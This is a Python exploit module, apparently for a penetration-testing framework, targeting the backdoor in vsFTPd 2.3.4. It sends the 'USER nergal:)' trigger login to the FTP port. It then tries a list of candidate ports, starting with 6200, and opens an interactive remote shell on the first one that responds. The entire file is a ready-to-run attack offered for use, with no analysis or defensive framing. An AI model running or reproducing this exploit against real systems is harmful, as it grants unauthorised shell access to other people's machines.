"""
vsFTPd 2.3.4 Backdoor Exploit - Auto Port Detection
"""

MODULE_INFO = {
    "description": "vsFTPd exploit with automatic backdoor port detection"
}

OPTIONS = {
    "host": {
        "type": "str",
        "description": "Target host IP address", 
        "required": True,
        "default": ""
    },
    "port": {
        "type": "int",
        "description": "FTP port",
        "required": False,
        "default": 21
    },
    "backdoor_ports": {
        "type": "str",
        "description": "Backdoor ports to try (comma separated)",
        "required": False,
        "default": "6200,4444,1337,31337,12345"
    }
}

from telnetlib import Telnet
import socket

def run(session, options):
    host = options.get("host", "")
    port_ftp = int(options.get("port", 21))
    backdoor_ports_str = options.get("backdoor_ports", "6200,4444,1337,31337,12345")
    
    # Parse backdoor ports
    backdoor_ports = [int(p.strip()) for p in backdoor_ports_str.split(",")]
    
    if not host:
        print("[!] Error: Host option is required")
        return False
    
    print(f"[*] Starting vsFTPd Auto-Detection Exploit")
    print(f"[*] Target: {host}:{port_ftp}")
    print(f"[*] Backdoor ports to try: {backdoor_ports}")
    
    try:
        # Trigger backdoor
        print(f"[*] Connecting to FTP service...")
        tn = Telnet(host, port_ftp)
        
        banner = tn.read_until(b"FTP", timeout=10)
        print(f"[*] Service: {banner.decode('utf-8', errors='ignore').strip()}")
        
        # Send payload
        user = "USER nergal:)"
        password = "PASS pass"
        
        print(f"[*] Sending payload...")
        tn.write(user.encode('ascii') + b"\n")
        tn.read_until(b"password", timeout=10)
        tn.write(password.encode('ascii') + b"\n")
        tn.close()
        
        # Try multiple backdoor ports
        print(f"[*] Scanning for backdoor...")
        for bd_port in backdoor_ports:
            try:
                print(f"[*] Trying port {bd_port}...")
                tn2 = Telnet(host, bd_port, timeout=5)
                
                print(f"[+] SUCCESS! Backdoor found on port {bd_port}!")
                print("[+] Starting interactive session...")
                print("-" * 50)
                
                tn2.interact()
                print(f"\n[*] Session on port {bd_port} closed")
                return True
                
            except (ConnectionRefusedError, socket.timeout):
                print(f"[-] Port {bd_port} closed")
                continue
            except Exception as e:
                print(f"[!] Error on port {bd_port}: {e}")
                continue
        
        print("[!] No backdoor found on any tested ports")
        return False
        
    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        return False